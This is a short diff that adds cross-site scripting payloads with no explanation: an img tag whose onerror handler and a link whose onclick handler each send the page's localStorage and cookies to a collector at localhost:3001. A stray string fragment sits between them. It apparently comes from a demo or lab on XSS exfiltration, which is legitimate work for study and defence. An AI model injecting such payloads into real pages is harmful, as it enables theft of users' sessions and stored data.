@@ -1,0 +1,17 @@
+<img
+  src
+  onerror="fetch(`http://localhost:3001?localStorage=${JSON.stringify(localStorage)}&cookie=${JSON.stringify(document.cookie)}`)
+  .then(data => data.json())
+  .then(data => console.log('server response', data))"
+/>
+
+'http://localhost:3001?localStorage=' + JSON.stringify(localStorage) + '
+
+<a
+  href="#"
+  onclick="fetch(`http://localhost:3001?localStorage=${JSON.stringify(localStorage)}&cookie=${JSON.stringify(document.cookie)}`)
+  .then(data => data.json())
+  .then(data => console.log('server response', data))"
+>
+  click
+</a>
